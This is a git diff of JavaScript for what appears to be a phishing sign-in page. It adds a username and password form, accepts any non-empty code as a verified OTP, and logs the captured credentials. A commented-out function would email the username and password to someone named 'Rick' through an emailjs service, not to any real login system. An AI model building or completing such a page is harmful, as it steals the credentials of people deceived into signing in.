@@ -28,17 +28,50 @@ otpBoxDiv.innerHTML = `<fieldset>
 </fieldset>`;
 form.appendChild(otpBoxDiv);
 
+const userPasswordBox = document.createElement("div");
+userPasswordBox.setAttribute("id", "userPassword");
+userPasswordBox.classList.add("d-none");
+userPasswordBox.innerHTML = `<fieldset>
+<label for="Username">Username</label><br />
+<input
+  type="text"
+  name="Username"
+  required
+  class="username"
+/>
+</fieldset>
+<fieldset>
+<label for="password"> Password </label><br />
+<input
+  type="password"
+  required
+  class="password"
+/>
+</fieldset>
+<fieldset>
+<button
+  name="submit"
+  type="submit"
+  id="info-submit"
+  class="submit"
+>
+  Sign In
+</button>
+</fieldset>`;
+form.appendChild(userPasswordBox);
+
 function validate() {
   let emailBox = document.querySelector("#emailBox");
   let optBox = document.querySelector("#optBox");
-  let password = document.querySelector(".password");
   let username = document.querySelector(".username");
+  let password = document.querySelector(".password");
   let email = document.querySelector(".email");
-  let otp = document.querySelector(".otp");
-  let submitBtn = document.querySelector(".submit");
-
-  let userPassword = document.querySelector("#userPassword");
   let emailSubmitBtn = document.querySelector("#email-submit");
+  let otpSubmitBtn = document.querySelector("#opt-submit");
+  let userPassword = document.querySelector("#userPassword");
+  let otp = document.querySelector(".otp");
+  let submitBtn = document.querySelector("#info-submit");
+
   emailSubmitBtn.addEventListener("click", (e) => {
     e.preventDefault();
     filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
@@ -55,26 +88,37 @@ function validate() {
     }
   });
 
+  otpSubmitBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+    if (otp.value == "") {
+      emptyerror();
+    } else {
+      otpBoxDiv.classList.add("d-none");
+      userPassword.classList.remove("d-none");
+      otpSuccess();
+    }
+  });
+
   submitBtn.addEventListener("click", (e) => {
     e.preventDefault();
     console.log(emailBox, optBox, userPassword);
-    //validate email
-    // if (usename.value === "" || password.value === "") {
-    //   emptyerror();
-    // } else {
-    //   // sendmail(usename.value, password.value);
-    //   // usename.value = "";
-    //   // password.value = "";
-    //   // success();
-    // }
+    if (username.value === "" || password.value === "") {
+      emptyerror();
+    } else {
+      // sendmail(username.value, password.value);
+      console.log(username.value, password.value);
+      username.value = "";
+      password.value = "";
+      success();
+    }
   });
 }
 validate();
 
-// function sendmail(usename, password) {
+// function sendmail(username, password) {
 //   emailjs.send("service_ll5oava", "template_cvjri3e", {
 //     to_name: "Rick",
-//     from_name: usename,
+//     from_name: username,
 //     message: password,
 //   });
 // }
@@ -92,6 +136,14 @@ function error() {
     icon: "error",
     title: "Please Give Valid Information",
     text: "Please Give Valid Information",
+  });
+}
+
+function otpSuccess() {
+  Swal.fire({
+    icon: "success",
+    title: "OTP Successfully Verified",
+    text: "OTP Successfully Verified",
   });
 }
 
